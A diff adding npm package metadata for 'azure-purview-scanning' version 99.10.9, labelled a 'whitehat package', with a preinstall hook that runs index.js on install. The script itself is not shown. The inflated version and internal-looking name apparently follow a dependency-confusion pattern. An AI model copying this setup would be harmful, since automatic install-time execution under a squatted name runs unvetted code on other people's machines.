@@ -1,0 +1,39 @@
+{
+    "name": "azure-purview-scanning",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-purview-scanning@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-RiG0k/c/ZLoV2kjcruVbV6eRg5/HbsGfOgCmAG9huB4krVTAb9mALdDgRc0VWos4o439JMsJEZXloFKkNIHSmw==",
+        "shasum": "f5d93e4504b6f20aeba637b62ba3721cf780b15d",
+        "tarball": "https://registry.npmjs.org/azure-purview-scanning/-/azure-purview-scanning-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3586,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSvACRA9TVsSAnZWagAAxZkP/0xozlG59/qu4XxR+ThO\n60nlYxbFB7ORC/QIePZ0IrMHhZBI5nmx1wrFwiuZSLhg3kaGyxYzRdpvqYJm\nhAL9BoxIxU5i+nhBwPLSb0vcsvpj3JTmC7FC3rWaUgSS4oTlxefqzEUUpvuk\n3RR67lWfMJeGH+79oEtaKIpfRQ1nugz8/zuzNgabZCuIrQ+8Se6dpXV0WDVL\nHeAPHxpNfUfWdqlg5MPXSel/5RCEchYNc6TEOw/6v5dbYT+Ix2/jUHtOBPW9\nqy4Rm01ZBhYevn+v1aBqFPsEE3T59eDyGBiMaf9eg8p8DA908TGCQzQshMTR\nZgiJrB+J1X26GBqaNLN6s1RaC3caj7Tc9Z5SiW2jvHTW1k9H1cA0RQ6w4zyt\nvYtkKXPOyGJNEwuMWqe+G9mQYBJsvlPONjXTIL3mV5Kq90l2sQ8Ix45do6Hw\nCuBLLSyL5n8JY06rJlrAXIhHPe48iYxcHufqorVEUNMAlEiAwI/T/ZUkR/od\nc3FAsAMIfVqclyDpgRtrXOjE9chAEL6RLhcKzNOdHuKDYfMJ/7/VRGTOtEh/\nAvdZiaCfmfPryDXPwKgajM1cvIUyzoLjbtVsRa+gXeGeBaEYL77JoqKBn2vH\nH1Q0/Q2uWhSr7fccZfHA+ctCubDuvZebJaCVLckNoHjqyJPBd9jMpd6v4a3X\ngjwF\r\n=wMCj\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-purview-scanning_99.10.9_1637952448825_0.29966281323814314"
+    },
+    "_hasShrinkwrap": false
+}
